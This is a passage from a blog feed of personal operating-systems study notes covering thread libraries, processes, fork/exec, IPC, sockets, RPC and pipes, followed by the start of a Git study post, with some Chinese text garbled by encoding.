Kernel-Level Thread Libraries (Implicit Abstractions)</h3><p>Examples: Thread pools, OpenMP (<code>omp.h</code>), Grand Central Dispatch (GCD)</p><h4 id="characteristics-2"><a class="markdownIt-Anchor" href="#characteristics-2"></a> Characteristics:</h4><ul><li><strong>Higher-Level Abstractions:</strong><br>These libraries or frameworks hide most of the low-level thread management details from the programmer. <u>Instead of directly managing threads, you typically submit <strong>task</strong> or use <strong>parallel constructs</strong>, and the system determines how threads are allocated</u>.</li><li><strong>Kernel-Managed Threads:</strong><br>These abstractions often rely on kernel threads for execution, meaning the kernel scheduler handles thread creation, termination, and context switching.</li><li><strong>Dynamic Resource Management:</strong><br>They dynamically adjust thread usage to match the available hardware resources (e.g., CPU cores) and workload. For example:<ul><li><strong>Thread pools</strong> reuse threads to minimize thread creation and destruction overhead.</li><li><strong>OpenMP</strong> dynamically distributes work across threads with constructs like <code>#pragma omp parallel for</code>.</li><li><strong>GCD</strong> (on Apple platforms) uses queues to schedule tasks onto kernel threads efficiently.</li></ul></li></ul><h3 id="why-they-seem-the-same-to-programmers"><a class="markdownIt-Anchor" href="#why-they-seem-the-same-to-programmers"></a> Why They â€œSeem the Sameâ€ to Programmers</h3><p>From a usability perspective, they may feel similar because:</p><ol><li>Both allow concurrent execution.</li><li>The higher-level abstractions are designed to make concurrency <strong>easier</strong>, hiding the underlying complexity.</li></ol><p>However, the <strong>level of abstraction</strong> and <strong>degree of control</strong> are vastly different. If youâ€™re using <code>pthread</code>, youâ€™re <strong>explicitly</strong> in charge of the threads, while with something like OpenMP or GCD, youâ€™re simply defining tasks, and the <strong>framework/library manages everything else</strong>.</p><hr><p><strong>Reference:</strong></p><ul><li><a href="https://stackoverflow.com/questions/5440128/thread-context-switch-vs-process-context-switch">https://stackoverflow.com/questions/5440128/thread-context-switch-vs-process-context-switch</a></li><li><a href="https://users.cs.duke.edu/~narten/110/nachos/main/node13.html">https://users.cs.duke.edu/~narten/110/nachos/main/node13.html</a></li><li><a href="https://www.youtube.com/watch?v=M9HHWFp84f0">Why Are Threads Needed On Single Core Processors - Core Dumped</a></li><li><a href="https://stackoverflow.com/questions/15983872/difference-between-user-level-and-kernel-supported-threads">https://stackoverflow.com/questions/15983872/difference-between-user-level-and-kernel-supported-threads</a></li><li><a href="https://cseweb.ucsd.edu/classes/sp16/cse120-a/applications/ln/lecture4.html">https://cseweb.ucsd.edu/classes/sp16/cse120-a/applications/ln/lecture4.html</a></li><li>ChatGPT-4o</li><li><em>Operating System Concepts, 9th edition</em></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;key-objectives&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#key-objectives&quot;&gt;&lt;/a&gt; Key objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Introduce the notion of a thre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Process Concept</title>
    <link href="http://example.com/2024/11/17/Operating-System-Concepts-Ch3/"/>
    <id>http://example.com/2024/11/17/Operating-System-Concepts-Ch3/</id>
    <published>2024-11-17T08:13:46.470Z</published>
    <updated>2025-04-12T08:51:37.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="key-objectives"><a class="markdownIt-Anchor" href="#key-objectives"></a> Key objectives</h1><ul><li>To learn the notion wof a process - a program in execution.</li><li>To describe the various features of processes, including scheduling, creation, and termination.</li><li>To introduce interprocess communication using shared memory and message passing.</li></ul><h1 id="process-concept"><a class="markdownIt-Anchor" href="#process-concept"></a> Process Concept</h1><h2 id="1-the-process"><a class="markdownIt-Anchor" href="#1-the-process"></a> 1. The process</h2><p>Informally, a process can be considered as a program in execution. While a program is a <em>passive</em> entity (often called an <strong>executable file</strong>), a process is an <em>active</em> entity with a PC spcifying the next instruction to execute and a set of associated resources.</p><p>So what do we mean by the term â€œresourcesâ€? We know that a process is more than the program code, which is known as the <strong>text section</strong>, it also includes the current activity and the contents of the processorâ€™s registers. A process also includes the runtime process <strong>stack</strong>, which contains temporary data, and a <strong>data section</strong>, which contains global variables, and a heap, which is memory that is dynamically allocated during process run time. Following diagram shows the structure of a process in memory:<img src="/2024/11/17/Operating-System-Concepts-Ch3/memory_diagram.png" alt="memory_diagram.png"></p><hr><blockquote><p>è¡¥å……ï¼šLinux ä¸ŠæŸ¥çœ‹è¿›ç¨‹åœ°å€ç©ºé—´</p></blockquote><ol><li>æŸ¥çœ‹<code>/proc/&lt;PID&gt;/maps</code>æ–‡ä»¶</li></ol><ul><li>ç›´æ¥è¯»å–å†…æ ¸æä¾›çš„è™šæ‹Ÿæ–‡ä»¶ï¼Œæ˜¾ç¤ºè¿›ç¨‹çš„å®Œæ•´å†…å­˜å¸ƒå±€ï¼ˆä»£ç æ®µã€å †ã€æ ˆã€å…±äº«åº“ç­‰ï¼‰ã€‚<img src="/2024/11/17/Operating-System-Concepts-Ch3/proc.png" alt="proc.png"></li></ul><ol start="2"><li>ä½¿ç”¨<code>pmap</code>å‘½ä»¤<br><img src="/2024/11/17/Operating-System-Concepts-Ch3/pmap.png" alt="pmap.png"></li></ol><hr><h2 id="2-process-state"><a class="markdownIt-Anchor" href="#2-process-state"></a> 2. Process state</h2><p>A process may be in one of the states:</p><ul><li><strong>New</strong>: The process is being created.</li><li><strong>Running</strong>: Instructions are being executed.</li><li><strong>Waiting</strong>: The process is waiting for some event to occur (such as an I/O completion).</li><li><strong>Ready</strong>: The process is waiting to be assigned to a processor.</li><li><strong>Terminated</strong>: The process has finished execution.<br><img src="/2024/11/17/Operating-System-Concepts-Ch3/diagram-of-process-state.jpg" alt="diagram-of-process-state.jpg"></li></ul><h2 id="3-process-control-block"><a class="markdownIt-Anchor" href="#3-process-control-block"></a> 3. Process Control Block</h2><p>In the foregoing text we mentioned the structure of process in memory, which I think is the <strong>â€œmemoryâ€™s viewâ€</strong> of the process. Each process is represented in the operating system by a <strong>process conrol block (PCB)</strong>, which I think is essentially a â€œschedulerâ€™s viewâ€ of the process.</p><p>PCB holds the metadata necessary for the OS to manage the process, containing many pieces of information:</p><ul><li><strong>Process state</strong></li><li><strong>Program counter</strong></li><li><strong>CPU registers</strong></li><li><strong>CPU-scheduling information</strong> (Ch 5.)</li><li><strong>Memory-management information</strong> (Ch 8.)</li><li><strong>Accounting information</strong>: including the amount of CPU and real time used, time limits, account number, process numbers, etc</li><li><strong>I/O status information</strong>: the list of I/O devices allocated to the process, a list of files, etc</li></ul><p>So, while the process structure in memory <strong>reflects the actual memory layout and runtime environment</strong> of the process, the PCB serves as the <strong>abstracted record that the OS scheduler uses</strong> to manage and control process execution.</p><p>Here is a more detailed introduction of PCB: <a href="https://www.geeksforgeeks.org/process-control-block-in-os/">https://www.geeksforgeeks.org/process-control-block-in-os/</a></p><h1 id="process-scheduling"><a class="markdownIt-Anchor" href="#process-scheduling"></a> Process Scheduling</h1><p>The objective of mutiprogramming is to have some process running at all times, to maximize CPU utilization. The objective of time sharing is to switch the CPU among processes to so frequently that users can interact with each program while it is running. To meet this objectives, the <strong>process scheduler</strong> selects an available process for program execution on the CPU.</p><h2 id="1-scheduling-queue"><a class="markdownIt-Anchor" href="#1-scheduling-queue"></a> 1. Scheduling queue</h2><p>Scheduling queue is the place where a process will be selected for execution. A common representation of process scheduling is a queueing diagram:<img src="/2024/11/17/Operating-System-Concepts-Ch3/queuing-diagram.png" alt="queuing-diagram.png"></p><h2 id="2-scheduler"><a class="markdownIt-Anchor" href="#2-scheduler"></a> 2. Scheduler</h2><p>The selection process we mentioned is carried out by the appropriate scheduler. Typically, there are two types of schedulers: <strong>long-term scheduler</strong> and <strong>short-term scheduler</strong>.</p><ul><li><strong>long-term scheduler (job scheduler)</strong>: selects processes from the pool and loads them into memory</li><li><strong>short-term scheduler (CPU scheduler)</strong>: selects from among the processes that are ready to execute and allocates the CPU to one of them</li></ul><p>It is important that the long-term scheduler select a god <em>process mix</em> of <strong>I/O-bound process</strong> and <strong>CPU-bound process</strong>, to make maximized utilization of CPU and other peripherals.</p><h1 id="operations-on-processes"><a class="markdownIt-Anchor" href="#operations-on-processes"></a> Operations on Processes</h1><h2 id="1-process-creation-forkexec"><a class="markdownIt-Anchor" href="#1-process-creation-forkexec"></a> 1. Process creation: <code>fork()</code>&amp;<code>exec()</code></h2><p>When a process creates a new process, it invokes <code>fork()</code> system call, then two processes will exist: the parent and the child. They each have their own independent memory space, <strong>created as a duplicate of the parent processâ€™s memory image at the time of the <code>fork()</code>.</strong> So, while they initially share the same memory contents, they donâ€™t share the same memory spaceâ€”any changes in the memory of one process do not affect the other.</p><hr><blockquote><p>è¡¥å……ï¼šä¸ºä»€ä¹ˆåˆ›å»ºè¿›ç¨‹æ˜¯è®¾è®¡ä¸º<code>fork()</code>çš„å¤åˆ¶ï¼Œè€Œé OS ç›´æ¥ spawn æˆ– create ï¼Ÿ</p></blockquote><p>1.Â <strong>å†å²ä¸è®¾è®¡å“²å­¦</strong><br>Unix çš„æ—©æœŸè®¾è®¡ï¼ˆ1970 å¹´ä»£ï¼‰å¼ºè°ƒ Â <strong>ç®€å•æ€§</strong>Â  å’Œ Â <strong>æ¨¡å—åŒ–</strong>ï¼Œ<code>fork()</code>Â  çš„æœºåˆ¶å®Œç¾å¥‘åˆäº†è¿™ä¸€ç†å¿µï¼š</p><ul><li><strong>æœ€å°åŒ–å†…æ ¸åŠŸèƒ½</strong>ï¼š<code>fork()</code>Â  åªéœ€å¤åˆ¶ç°æœ‰è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œè€Œä¸éœ€è¦åœ¨å†…æ ¸ä¸­å®ç°å¤æ‚çš„â€œå¯åŠ¨æ–°ç¨‹åºâ€é€»è¾‘ã€‚å¯åŠ¨æ–°ç¨‹åºçš„ä»»åŠ¡è¢«åˆ†ç¦»åˆ° Â <code>exec()</code>Â  å‡½æ•°ä¸­ï¼Œä¸¤è€…ç»„åˆä½¿ç”¨ï¼ˆ<code>fork()</code>Â +Â <code>exec()</code>ï¼‰æä¾›äº†æå¤§çš„çµæ´»æ€§ã€‚</li><li><strong>å¤ç”¨ç°æœ‰é€»è¾‘</strong>ï¼šé€šè¿‡ Â <code>fork()</code>Â  å¤åˆ¶çˆ¶è¿›ç¨‹ï¼Œå­è¿›ç¨‹å¯ä»¥ç›´æ¥ç»§æ‰¿çˆ¶è¿›ç¨‹çš„ç¯å¢ƒï¼ˆå¦‚æ–‡ä»¶æè¿°ç¬¦ã€ä¿¡å·å¤„ç†ã€æƒé™ç­‰ï¼‰ï¼Œæ— éœ€é‡æ–°é…ç½®ï¼Œå‡å°‘äº†é‡å¤ä»£ç ã€‚</li></ul><ol start="2"><li><strong>æ€§èƒ½ä¼˜åŒ–ï¼šå†™æ—¶å¤åˆ¶ï¼ˆCopy-On-Write, COWï¼‰</strong><br>è™½ç„¶ Â <code>fork()</code>Â  è¡¨é¢ä¸Šæ˜¯â€œå¤åˆ¶æ•´ä¸ªè¿›ç¨‹â€ï¼Œä½†ç°ä»£æ“ä½œç³»ç»Ÿé€šè¿‡ Â <strong>å†™æ—¶å¤åˆ¶</strong>Â  æŠ€æœ¯å¤§å¹…ä¼˜åŒ–äº†å…¶æ€§èƒ½ï¼š</li></ol><ul><li><p><strong>å»¶è¿Ÿç‰©ç†å†…å­˜å¤åˆ¶</strong>ï¼š<code>fork()</code>Â  åï¼Œçˆ¶å­è¿›ç¨‹å…±äº«åŒä¸€ç‰©ç†å†…å­˜ï¼Œç›´åˆ°æŸä¸€æ–¹å°è¯•ä¿®æ”¹å†…å­˜é¡µæ—¶ï¼Œæ‰ä¼šè§¦å‘å®é™…çš„å¤åˆ¶ã€‚è¿™é¿å…äº†ä¸å¿…è¦çš„å†…å­˜å¼€é”€ã€‚</p></li><li><p><strong>é«˜æ•ˆä¸”é€æ˜</strong>ï¼šCOW ä½¿å¾— Â <code>fork()</code>Â  çš„æ—¶é—´å¤æ‚åº¦æ¥è¿‘ O(1)ï¼Œå³ä½¿çˆ¶è¿›ç¨‹å ç”¨å¤§é‡å†…å­˜ï¼Œ<code>fork()</code>Â  ä»èƒ½å¿«é€Ÿå®Œæˆã€‚</p><p>3.Â <strong>çµæ´»æ€§ä¸æ§åˆ¶</strong><br><code>fork()</code>Â +Â <code>exec()</code>Â  çš„ç»„åˆæä¾›äº†ç²¾ç»†çš„è¿›ç¨‹æ§åˆ¶èƒ½åŠ›ï¼š</p></li><li><p><strong>çˆ¶å­è¿›ç¨‹å…±äº«åˆå§‹åŒ–çŠ¶æ€</strong>ï¼šå­è¿›ç¨‹å¯ä»¥ç»§æ‰¿çˆ¶è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼ˆå¦‚æ‰“å¼€çš„æ–‡ä»¶ã€ä¿¡å·å¤„ç†å‡½æ•°ã€ç¯å¢ƒå˜é‡ç­‰ï¼‰ï¼Œæ–¹ä¾¿çˆ¶å­åä½œï¼ˆä¾‹å¦‚ç®¡é“é€šä¿¡ï¼‰ã€‚</p></li><li><p><strong>ä¸­é—´æ­¥éª¤çš„å®šåˆ¶</strong>ï¼šåœ¨ Â <code>fork()</code>Â  ä¹‹åã€<code>exec()</code>Â  ä¹‹å‰ï¼Œå­è¿›ç¨‹å¯ä»¥ä¿®æ”¹è‡ªèº«ç¯å¢ƒï¼ˆå¦‚é‡å®šå‘æ ‡å‡†è¾“å…¥è¾“å‡ºã€è°ƒæ•´æƒé™ã€å…³é—­ä¸éœ€è¦çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œè€Œæ— éœ€æ”¹åŠ¨çˆ¶è¿›ç¨‹æˆ–å†…æ ¸ä»£ç ã€‚</p><p>4.Â <strong>ä¸ Â <code>spawn</code>Â  æˆ– Â <code>create</code>Â  çš„å¯¹æ¯”</strong><br>ç›´æ¥æä¾› Â <code>spawn</code>Â  æˆ– Â <code>create</code>Â  çš„æ¥å£ï¼ˆå¦‚ Windows çš„ Â <code>CreateProcess</code>ï¼‰çœ‹ä¼¼æ›´ç®€æ´ï¼Œä½†å­˜åœ¨ä»¥ä¸‹æƒè¡¡ï¼š</p></li><li><p><strong>çµæ´»æ€§å—é™</strong>ï¼šä¸€æ­¥åˆ°ä½çš„ Â <code>spawn</code>Â  éœ€è¦åœ¨æ¥å£ä¸­é¢„è®¾æ‰€æœ‰å¯èƒ½çš„å‚æ•°ï¼ˆå¦‚ç¯å¢ƒå˜é‡ã€æ–‡ä»¶æè¿°ç¬¦ç»§æ‰¿è§„åˆ™ç­‰ï¼‰ï¼Œå¯¼è‡´æ¥å£å¤æ‚åŒ–ã€‚</p></li><li><p><strong>æ€§èƒ½å¼€é”€</strong>ï¼šæ¯æ¬¡åˆ›å»ºè¿›ç¨‹éƒ½éœ€é‡æ–°åˆå§‹åŒ–æ‰€æœ‰èµ„æºï¼ˆå¦‚å†…å­˜ç©ºé—´ã€æ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œè€Œ Â <code>fork()</code>Â  é€šè¿‡ COW å’Œç»§æ‰¿æœºåˆ¶é¿å…äº†é‡å¤åˆå§‹åŒ–ã€‚</p></li><li><p><strong>ä¸ Unix å·¥å…·é“¾çš„å…¼å®¹æ€§</strong>ï¼š<code>fork()</code>Â  çš„è®¾è®¡ä¸ Unix çš„ç®¡é“ï¼ˆ<code>pipe</code>ï¼‰ã€ä¿¡å·ï¼ˆ<code>signal</code>ï¼‰ç­‰æœºåˆ¶æ·±åº¦é›†æˆï¼Œç›´æ¥ Â <code>spawn</code>Â  å¯èƒ½ç ´åè¿™ç§ç”Ÿæ€ã€‚</p></li></ul><hr><p>The <code>exec()</code> system call replaces the current processâ€™s memory with a new program. When a process (either the parent or the child) calls <code>exec()</code>, it loads the specified binary executable into its own memory space, overwriting the existing program code, stack, heap, and data segments. This effectively â€œdestroysâ€ the memory image of the process that existed before the <code>exec()</code> call and replaces it with a new one.</p><p>This replacement doesnâ€™t affect the other process, though:</p><ol><li><strong>Independent Memory Spaces:</strong> After <code>fork()</code>, the parent and child processes have separate memory spaces. So when the child (or the parent) calls <code>exec()</code>, it only affects that processâ€™s memory, not the otherâ€™s.</li><li><strong>Process Continuation After <code>exec()</code>:</strong> After calling <code>exec()</code>, the process (now with a new memory image) continues execution at the entry point of the new program, rather than the program that was previously running. It can still execute because the <code>exec()</code> call replaces the memory but not the process ID (PID). The process itself persists, but its memory contents are now those of the new program.</li></ol><h2 id="2-process-termiation-waitexit"><a class="markdownIt-Anchor" href="#2-process-termiation-waitexit"></a> 2. Process termiation: <code>wait()</code>&amp;<code>exit()</code></h2><p>A process terminates when it finishes executing its final statement and asks the operating system to delete it by using the <code>exit()</code> system call. At hat point, the process may return a status value to its parent proess (via the <code>wait()</code> system call).</p><p>After the <code>exit()</code> sys call, all the resources of the processâ€”including physical and virtual memory, open files, and I/O buffersâ€”are deallocated by the operating system. However, it entry in the process table must remain there until the parent calls <code>wait()</code>, because the process table contains the processâ€™s exit status.</p><h1 id="interprocess-communication"><a class="markdownIt-Anchor" href="#interprocess-communication"></a> Interprocess Communication</h1><p>Cooperating processes require an <strong>interprocess communicaton (IPC)</strong> mechanism that will allow them to exchange data and information with each other. There are two fundamental models of IPC: <strong>shared-memory</strong> and <strong>message-passing</strong>.</p><h2 id="1-shared-memory-model"><a class="markdownIt-Anchor" href="#1-shared-memory-model"></a> 1. Shared-memory model</h2><p>In thisÂ IPC Model, a shared memory region is established which is used by the processes for data communication. This memory region is <strong>present in the address space of the process which creates the shared memory segment</strong>. The processes that want to communicate with this process should <strong>attach this memory segment to their address space</strong>.</p><p>Hereâ€™s a basic outline of how shared memory IPC operates:</p><ul><li><strong>Creation of Shared Memory Segment:</strong>Â A process usually the parent, creates a shared memory segment using the system calls like <code>shmget()</code> in Unix-like systems. This segment is assigned the unique identifier (<code>shmid</code>).</li><li><strong>Attaching to the Shared Memory Segment:</strong>Â The Processes that need to access the shared memory attach themselves to this segment using <code>shmat()</code> system call. Once attached the processes can directly read from and write to the shared memory.</li><li><strong>Synchronization:</strong>Â Since multiple processes can access the shared memory simultaneously synchronization mechanisms like semaphores are often used to the <strong>prevent race conditions and ensure data consistency</strong>.</li><li><strong>Detaching and Deleting the Segment:</strong>Â When a process no longer needs access to the shared memory it can detach from the segment using <code>shmdt()</code> system call. The shared memory segment can be removed entirely from system using <code>shmctl()</code> once all processes have the detached.</li></ul><h2 id="2-message-passing-model"><a class="markdownIt-Anchor" href="#2-message-passing-model"></a> 2. Message-passing model</h2><p>Message passing provides a mechanism to allow processes to communicate and to synchronize their actions without sharing the same address space. A message-passing facility provides at least two operations: <code>send(message)</code>and<code>receive(message)</code>. To satisfy these purposes, a <em>logical communication link</em> is needed.</p><p>Although the message queue is not maintained by the processes but the kernel, synchronization problem still exists. There are two types of implements: <code>sychronous message passing (blocking)</code> and <code>asynchronous message passing (non-blocking)</code>.</p><table><thead><tr><th>Shared Memory Model</th><th>Message Passing Model</th></tr></thead><tbody><tr><td>The shared memory region is used for communication.</td><td>A message-passing facility is used for communication.</td></tr><tr><td>It is used for communication between processes on a single processor or multiprocessor system where the communicating processes reside on the same machine as the communicating processes share a common address space.</td><td>It is typically used in a distributed environment where communicating processes reside on remote machines connected through a network.</td></tr><tr><td>The code for reading and writing the data from the shared memory should be written explicitly by the Application programmer.</td><td>No such code is required here as the message-passing facility provides a mechanism for communication and synchronization of actions performed by the communicating processes.</td></tr><tr><td>It provides a maximum speed of computation as communication is done through shared memory so system calls are made only to establish the shared memory.</td><td>It is time-consuming as message passing is implemented through kernel intervention (system calls).</td></tr><tr><td>Here the processes need to ensure that they are not writing to the same location simultaneously.</td><td>It is useful for sharing small amounts of data as conflicts need not be resolved.</td></tr><tr><td>Faster communication strategy.</td><td>Relatively slower communication strategy.</td></tr><tr><td>NoÂ kernelÂ intervention.</td><td>It involves kernel intervention.</td></tr><tr><td>It can be used in exchanging larger amounts of data.</td><td>It can be used in exchanging small amounts of data.</td></tr><tr><td>Example-Â <br><br>- Data from a client process may need to be transferred to a server process for modification before being returned to the client.</td><td>Example-Â <br><br>- Web browsers<br>- Web Servers<br>- Chat program on WWW (World Wide Web)</td></tr></tbody></table><h1 id="communication-in-client-server-system"><a class="markdownIt-Anchor" href="#communication-in-client-server-system"></a> Communication in Client-Server system</h1><h2 id="1-sockets"><a class="markdownIt-Anchor" href="#1-sockets"></a> 1. Sockets</h2><p>Sockets are designed to provide <strong>low-level communication mechanisms</strong>. They are (1) Closer to the network layer and (2) more flexible but require more work from the developer to interpret the data.</p><h3 id="whats-the-format-of-data-in-connection-between-sockets"><a class="markdownIt-Anchor" href="#whats-the-format-of-data-in-connection-between-sockets"></a> Whatâ€™s the format of data in connection between sockets</h3><p>We define sockets with the term <strong>&quot;low-level &quot;</strong> because sockets provide a way to send and receive <strong>raw data</strong> (byte streams). It is up to the developer to define the meaning, structure, and interpretation of these bytes. Sockets do not impose any structure on the data; they only transport it as an <strong>unstructed stream of bytes</strong>. In this way, the application must define a protocol to add structure, such as delimiters, headers, or serialization formats.</p><h3 id="designing-purpose"><a class="markdownIt-Anchor" href="#designing-purpose"></a> Designing purpose</h3><p>The purposes of socket are to provide a general-purpose communication mechanism and to focus on <strong>how</strong> to transmit data rather than its <strong>meaning</strong>.</p><hr><p>Hereâ€™s an example. When transmitting a message like <code>&quot;Hello, World!&quot;</code> over a socket, itâ€™s sent as a sequence of bytes:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">72 101 108 108 111 44 32 87 111 114 108 100 33</span><br></pre></td></tr></table></figure><p>The receiver must have prior knowledge of how to interpret these bytes:</p><ul><li>Are they plain text? Binary data? A serialized object?</li><li>Is there a delimiter to separate multiple messages?</li></ul><h2 id="2-remote-procedure-calls"><a class="markdownIt-Anchor" href="#2-remote-procedure-calls"></a> 2. Remote Procedure Calls</h2><h3 id="procedure-calls"><a class="markdownIt-Anchor" href="#procedure-calls"></a> Procedure calls</h3><p>A <strong>procedure call</strong> is a mechanism in programming where one piece of code (the caller) invokes a procedure or function defined elsewhere. During a procedure call:</p><ol><li>The caller temporarily suspends its execution.</li><li>Control transfers to the invoked procedure.</li><li>After the procedure finishes execution, control returns to the caller, optionally with a return value.</li></ol><p>That seems like a simple function call, which definitely satisfies synchronization and occurs in the same address space.</p><h3 id="rpc"><a class="markdownIt-Anchor" href="#rpc"></a> RPC</h3><p>RPC (Remote Procedure Call) systems are designed to make remote communication <strong>look and feel like a local function (procedure) call</strong>. To achieve this, they operate at a <strong>higher level of abstraction</strong> and handle the complexity of encoding/decoding data automatically.</p><p>Instead of directly send the raw data, the RPC framework serializes these parameters into a structured message format for transmission, and then convey them to sockets, thatâ€™s why we called them â€œhigher levelâ€.</p><h3 id="message-structure"><a class="markdownIt-Anchor" href="#message-structure"></a> Message Structure:</h3><ul><li>Messages are structured and follow a well-defined format (e.g., Protocol Buffers in gRPC, XML in XML-RPC, or JSON in JSON-RPC).</li><li>Each message includes metadata, method names, arguments, and return values.</li><li>This structure ensures that the receiver (server or client) knows how to decode and interpret the data.</li></ul><h3 id="designing-purpose-2"><a class="markdownIt-Anchor" href="#designing-purpose-2"></a> Designing purpose</h3><p>RPC not only simplifies distributed computing but also focus on <strong>what</strong> to transmit (parameters and return values), not <strong>how</strong> to transmit it.</p><h3 id="difference-and-relation-with-sockets"><a class="markdownIt-Anchor" href="#difference-and-relation-with-sockets"></a> Difference and relation with sockets:</h3><p>In essence, <strong>RPC builds on sockets</strong> to abstract away low-level details and provide a structured, user-friendly interface for developers.</p><ul><li><strong>Sockets</strong> provide a flexible, low-level mechanism for transmitting unstructured byte streams, leaving structure and interpretation to the application developer.</li><li><strong>RPC</strong> adds an abstraction layer, automatically structuring messages (parameters, metadata, etc.) to simplify distributed computing and make remote calls feel like local ones.</li></ul><hr><p>In an RPC call, a function like <code>getUserData(123)</code> could be serialized into a message:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;getUserData&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">123</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>The server processes this structured message and sends back a structured response:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Alice&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">30</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3-pipes"><a class="markdownIt-Anchor" href="#3-pipes"></a> 3. Pipes</h2><p>A <strong>pipe</strong> acts as a conduit allowing two processes to communicate. In completing a pipe, four issues must be considered:</p><ol><li>Does the pope alow bidirectional communication or unidirectional?</li><li>If two-way communication is allowed, is it half duplex or full duplex?</li><li>Must a relationship (such as <strong><em>parent-child</em></strong>) exist between the communicating processes?</li><li>Can the pipes communicate over a network, or must the processes reside on the same machine?</li></ol><hr><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><ul><li><a href="https://www.geeksforgeeks.org/difference-between-shared-memory-model-and-message-passing-model-in-ipc/">https://www.geeksforgeeks.org/difference-between-shared-memory-model-and-message-passing-model-in-ipc/</a></li><li><a href="https://www.geeksforgeeks.org/process-control-block-in-os/">https://www.geeksforgeeks.org/process-control-block-in-os/</a></li><li><a href="https://en.wikipedia.org/wiki/Message_passing">https://en.wikipedia.org/wiki/Message_passing</a></li><li><em>Operating System Concept, 9th edition</em></li><li>ChatGPT-4o</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;key-objectives&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#key-objectives&quot;&gt;&lt;/a&gt; Key objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn the notion wof a proc</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GitäºŒå‘¨ç›®å­¦ä¹ </title>
    <link href="http://example.com/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-02T13:17:15.501Z</published>
    <updated>2024-12-03T06:27:42.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€"></a> å‰è¨€</h1><p>ä¸ŠåŠå¹´æ­å»ºå®Œåšå®¢ååˆæ­¥äº†è§£äº†ä¸€ä¸‹ git çš„å¸¸ç”¨æŒ‡ä»¤ï¼Œç¬¬ä¸€æ¬¡äº†è§£ git è¿™ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œä¹‹ååˆé›¶é›¶æ•£æ•£åœ°é€šè¿‡ä¸åŒæ…•è¯¾å’Œè§†é¢‘ï¼ˆ<em><a href="https://www.bilibili.com/video/BV1x7411H7wa/?spm_id_from=333.999.0.0">Missing semester</a></em>ï¼Œ<a href="https://www.bilibili.com/video/BV1Bu4y1K7yr/?spm_id_from=333.999.0.0">å—å¤§ ICS</a>å’Œ<a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.999.0.0">æŠ€æœ¯è›‹è€å¸ˆ</a>ï¼‰é‡æ¸©ï¼Œå¯æ˜¯æˆ‘å‘ç°åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰å¾ˆæ·±å…¥åœ°å»äº†è§£ git çš„ç›¸å…³æ¦‚å¿µå’Œå…·ä½“æ“ä½œä¹‹é—´çš„å…³ç³»ï¼Œå®é™…ä½¿ç”¨ä¸­è¿˜æ¶‰åŠä¸è¿œç«¯ä»“åº“çš„äº¤äº’ï¼Œå› æ­¤åœ¨åšå®éªŒæ—¶æ€»æ˜¯æå¾—ä¸€å›¢ä¹±éº» (screw up)ã€‚å­¦è‰ºä¸ç²¾æœ€ç»ˆåœ¨å®è·µä¸­å¸¦æ¥æ¶æœï¼Œå…¶ä¸­ç§ç§å› ç¼˜å’Œåˆä¸”æŒ‰ä¸‹ä¸è¡¨ã€‚æœ€ç»ˆæˆ‘åœ¨ç—›å®šæ€ç—›åå†³å¿ƒå¼€å¯æ–°å‘¨ç›®çš„ git å­¦ä¹ ï¼Œå¸Œæœ›èƒ½çœŸæ­£åœ°<strong>äº†è§£</strong>gitï¼Œä»¥åé‡åˆ°é—®é¢˜ä¸è‡³äºè¿ CSDN çš„è§£å†³æ–¹æ³•éƒ½çœ‹ä¸æ‡‚ã€‚</p><h1 id="å­¦ä¹ å†…å®¹"><a class="markdownIt-Anchor" href="#å­¦ä¹ å†…å®¹"></a> å­¦ä¹ å†…å®¹</h1><p>è¿™æ¬¡çš„å­¦ä¹ çš„å‚è€ƒèµ„æ–™ä¸»è¦æ˜¯ <em>Pro Git</em>ï¼Œå¹¶ä¸”æ³¨é‡å­¦ä¹ 